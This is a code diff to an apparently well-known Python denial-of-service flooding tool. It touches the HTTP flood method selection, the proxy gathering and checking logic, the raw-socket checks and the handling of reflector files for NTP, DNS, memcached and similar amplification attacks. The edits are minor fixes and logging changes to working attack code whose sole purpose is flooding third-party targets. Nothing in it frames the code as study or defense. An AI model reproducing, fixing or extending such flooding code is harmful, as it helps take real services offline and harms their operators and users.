@@ -36,7 +36,7 @@ ctx.verify_mode = CERT_NONE
 
 __version__ = "2.1 SNAPSHOT"
 __dir__ = Path(__file__).parent
-__ip__ = get('http://ip.42.pl/raw').text
+__ip__ = get('https://api.my-ip.io/ip').text
 
 
 def exit(*message):
@@ -412,8 +412,8 @@ class HttpFlood(Thread):
     @staticmethod
     def getMethodType(method: str) -> str:
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
-                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE"
-                                                                            "BOT"} \
+                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE",
+                                                                            "BOT",} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
@@ -902,7 +902,7 @@ class ToolsConsole:
                                    'status: %s') % (r.status_code,
                                                     "ONLINE" if r.status_code <= 500 else "OFFLINE"))
                             return
-                    print("Error!         ")
+                    print("Error!")
 
             if cmd == "INFO":
                 while True:
@@ -1082,6 +1082,8 @@ if __name__ == '__main__':
 
                     if proxy_ty not in {4, 5, 1, 0}: exit("Proxy Type Not Found [4, 5, 1, 0]")
                     if threads > 1000: logger.warning("thread is higher than 1000")
+                    if proxy_ty not in {4, 5, 1, 0}: exit("Socks Type Not Found [4, 5, 1, 0]")
+                    if threads > 1000: logger.warning("Thread is higher than 1000")
                     if rpc > 100: logger.warning("RPC (Request Pre Connection) is higher than 100")
 
                     if not proxy_li.exists():
@@ -1089,7 +1091,7 @@ if __name__ == '__main__':
                         proxy_li.parent.mkdir(parents=True, exist_ok=True)
                         with proxy_li.open("w") as wr:
                             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-                            logger.info(f"{len(Proxies):,} Proxies are getting checked, this may take awhile !")
+                            logger.info(f"{len(Proxies):,} Proxies are getting checked, this may take awhile!")
                             Proxies = ProxyChecker.checkAll(Proxies, url.human_repr(), 1, threads)
                             if not Proxies: exit(
                                 "Proxy Check failed, Your network may be the problem | The target may not be"
@@ -1101,7 +1103,7 @@ if __name__ == '__main__':
 
                     proxies = ProxyUtiles.readFromFile(proxy_li)
                     if not proxies:
-                        logger.info("Empty Proxy File, Running flood witout proxy")
+                        logger.info("Empty Proxy File, running flood witout proxy")
                         proxies = None
                     if proxies:
                         logger.info(f"Proxy Count: {len(proxies):,}")
@@ -1136,9 +1138,9 @@ if __name__ == '__main__':
                             not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
 
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
-                        if len(argv) == 7:
-                            logger.setLevel("DEBUG")
-                        if len(argv) == 6:
+                        if len(argv) >= 6:
+                            if len(argv) == 7:
+                              logger.setLevel("DEBUG")
                             refl_li = Path(__dir__ / "files" / argv[5].strip())
                             if not refl_li.exists(): exit("The Reflector file doesn't exist ")
                             ref = set(a.strip() for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))
